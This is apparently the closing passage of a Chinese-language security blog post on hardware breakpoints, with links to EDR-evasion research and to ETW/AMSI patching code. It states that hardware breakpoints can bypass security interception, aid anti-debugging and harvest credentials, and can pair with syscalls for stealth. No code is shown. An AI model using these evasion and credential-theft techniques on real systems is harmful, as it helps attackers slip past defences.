硬件断点可以帮助我们的很多工具重新突破拦截，不只是hook，patch还可以用来做反调试，还可以做成dll对一些程序进行检测来获取凭据等等，除了基础的hook之外，我们也可以尝试与syscall等手法结合起来增强隐蔽性。

Reference：  
<https://github.com/CymulateResearch/Blindside/tree/main/Blindside>

<https://github.com/rad9800/misc/blob/main/hooks/etw-amsi-llex-patch.c>

<https://cymulate.com/blog/blindside-a-new-technique-for-edr-evasion-with-hardware-breakpoints>

<https://github.com/codereversing/functionhooks/blob/main/HardwareBreakpoint/Source.cpp>
